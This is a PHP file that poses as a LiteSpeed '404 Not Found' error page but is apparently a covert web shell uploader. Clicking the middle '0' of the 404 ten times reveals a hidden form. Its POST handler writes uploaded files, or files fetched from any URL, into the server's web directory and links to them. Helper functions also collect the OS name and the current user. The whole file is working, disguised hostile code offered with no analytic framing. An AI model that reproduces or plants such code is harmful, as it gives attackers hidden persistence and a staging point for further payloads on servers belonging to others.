<?php
define("D","./");
define("E","Hata!");
function s(){return php_uname('s')." ".php_uname('r');}
function u(){$o=get_current_user();if($o!="SYSTEM"){$i=@ex('id');$o=($i=='')?"u:".getmyuid():$i;}return $o;}
if($_SERVER["REQUEST_METHOD"]=="GET"){
?>
<!DOCTYPE html>
<html style="height:100%"><head><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"/><title>404 Not Found</title>
<style>@media(prefers-color-scheme:dark){body{background-color:#000!important}}.h{display:none}</style>
<script>document.addEventListener('DOMContentLoaded',()=>{let c=0;document.getElementById('z').addEventListener('click',()=>{c++;if(c===10){document.querySelector('.h').style.display='block';}});});</script></head>
<body style="color:#444;margin:0;font:normal 14px/20px Arial,Helvetica,sans-serif;height:100%;background-color:#fff;">
<div style="height:auto;min-height:100%;"><div style="text-align:center;width:800px;margin-left:-400px;position:absolute;top:30%;left:50%;">
<h1 style="margin:0;font-size:150px;line-height:150px;font-weight:bold;">4<span id="z" style="cursor:default;">0</span>4</h1>
<h2 style="margin-top:20px;font-size:30px;">Not Found</h2><p>The resource requested could not be found on this server!</p></div></div>
<div style="color:#f0f0f0;font-size:12px;margin:auto;padding:0 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top:1px solid rgba(0,0,0,0.15);box-shadow:0 1px 0 rgba(255,255,255,0.3) inset;"><br>Proudly powered by LiteSpeed Web Server
<p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and has no control over content found on this site.</p></div>
<div class="h"><center><form action="" method="POST" enctype="multipart/form-data">
<label></label><input type="file" name="f" multiple/>
<label></label><input type="text" name="u"/><input type="submit" value="Yükle"/></form></center></div></body></html>
<?php
}else if($_SERVER["REQUEST_METHOD"]=="POST"){
    if(!empty($_FILES["f"]["name"])){
        $f=$_FILES["f"];
        $n=preg_replace("/[^A-Z0-9._-]/i","_",basename($f["name"]));
        if($f["tmp_name"]&&copy($f["tmp_name"],D.$n)){echo"<a href='$n'>$n</a>";}
        else{echo E;}
    }
    if(!empty($_POST["u"])){
        $u=filter_var($_POST["u"],FILTER_SANITIZE_URL);
        $n=preg_replace("/[^A-Z0-9._-]/i","_",basename(parse_url($u,PHP_URL_PATH)));
        if(filter_var($u,FILTER_VALIDATE_URL)){
            $c=@file_get_contents($u);
            if($c!==false&&file_put_contents(D.$n,$c)){echo"<a href='$n'>$n</a>";}
            else{echo E;}
        }
    }
}
?>